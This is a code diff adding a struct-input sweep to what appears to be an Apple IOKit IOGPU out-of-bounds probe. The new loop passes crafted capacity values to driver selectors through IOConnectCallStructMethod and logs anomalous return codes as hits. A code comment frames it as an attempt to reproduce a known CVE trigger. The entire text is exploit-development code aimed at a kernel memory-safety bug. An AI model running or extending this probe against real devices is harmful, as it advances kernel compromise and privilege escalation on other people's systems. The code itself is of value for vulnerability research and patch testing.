@@ -73,6 +73,29 @@ void nk_iogpu_oob_run(void) {
                             }
                             usleep(2000);
                         }
+                        /* struct-input sweep: the CVE trigger passes
+                           (capacity, flags) inside a struct (v3) — scalar
+                           sweep gave 0 anomalies; try 8/16-byte payloads. */
+                        for (uint32_t csSz = 8; csSz <= 16; csSz += 8) {
+                            static const uint64_t structCaps[4] = { 0, 63, 64, 4096 };
+                            for (uint32_t c2 = 0; c2 < 4; c2++) {
+                                uint8_t cin[32] = {0};
+                                uint8_t co[64] = {0};
+                                size_t coSize = 64;
+                                memcpy(cin, &structCaps[c2], sizeof(uint64_t));
+                                kern_return_t krS = IOConnectCallStructMethod(
+                                    conn, sel, cin, csSz, co, &coSize);
+                                if (krS != (kern_return_t)0xe00002c2 && krS != KERN_FAILURE
+                                    && krS != (kern_return_t)0xe00002c1
+                                    && krS != (kern_return_t)0xe00002c7) {
+                                    ol("[oob] STRUCTED %s type=%u sel=%u cap=%llu sz=%u kr=0x%x out=%lu",
+                                       names[nmi], t, sel, (unsigned long long)structCaps[c2],
+                                       csSz, krS, (unsigned long)coSize);
+                                    hits++;
+                                }
+                                usleep(2000);
+                            }
+                        }
                     }
                 }
                 IOServiceClose(conn);
